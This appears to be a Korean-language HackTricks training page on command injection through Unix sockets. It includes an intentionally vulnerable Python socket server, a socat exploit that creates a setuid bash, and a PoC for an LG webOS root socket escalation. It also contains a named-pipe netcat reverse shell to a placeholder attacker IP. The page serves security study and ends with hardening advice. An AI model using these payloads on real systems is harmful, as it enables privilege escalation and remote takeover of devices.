# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Python을 사용한 Socket binding 예제

다음 예제에서는 **unix socket이 생성되고** (`/tmp/socket_test.s`), **수신된 모든 내용이** `os.system`에 의해 **실행됩니다**.실제 환경에서 이런 코드를 발견할 가능성은 낮지만, 이 예제의 목적은 unix sockets을 사용하는 코드가 어떤 형태인지, 그리고 최악의 경우에 input을 어떻게 처리해야 하는지 확인하는 것입니다.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**실행** 다음 명령으로 코드를 실행하고: `python s.py` **socket이 어떻게 listening 중인지 확인하세요**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## 사례 연구: Root-owned UNIX socket signal-triggered escalation (LG webOS)

일부 권한이 있는 daemon은 신뢰할 수 없는 입력을 수락하고 권한이 있는 작업을 thread-ID 및 signal과 결합하는 root-owned UNIX socket을 노출합니다. 프로토콜을 통해 권한이 없는 client가 대상으로 지정할 native thread를 제어할 수 있다면, 권한이 있는 code path를 트리거하여 escalation할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

주요 write-up 및 disclosure에서는 다음 sequence를 설명합니다.<sup>[[1]](#references)[[2]](#references)</sup>

관찰된 pattern:
- root-owned socket에 연결합니다(예: /tmp/remotelogger).
- thread를 생성하고 해당 native thread ID(TID)를 가져옵니다.
- TID를 packed 형식과 padding과 함께 request로 전송하고 acknowledgement를 받습니다.
- 해당 TID에 특정 signal을 전달하여 권한이 있는 동작을 트리거합니다.

아래의 간략한 PoC는 이 sequence를 그대로 반영합니다.<sup>[[1]](#references)[[2]](#references)</sup>
최소 PoC 개요:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
이를 root shell로 전환하려면 간단한 named-pipe + nc 패턴을 사용할 수 있습니다.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- 이 유형의 bug는 권한이 없는 client state(TIDs)에서 파생된 값을 신뢰하고, 이를 권한이 있는 signal handler 또는 logic에 연결할 때 발생합니다.<sup>[[1]](#references)</sup>
- socket에서 credentials를 강제하고, message format을 검증하며, 권한이 있는 작업을 외부에서 제공된 thread identifier와 분리하여 보안을 강화합니다.

## References

- [1] [재미로 webOS Jailbreak하기 (그냥 재미로)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS TV Path Traversal, Authentication Bypass 및 Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
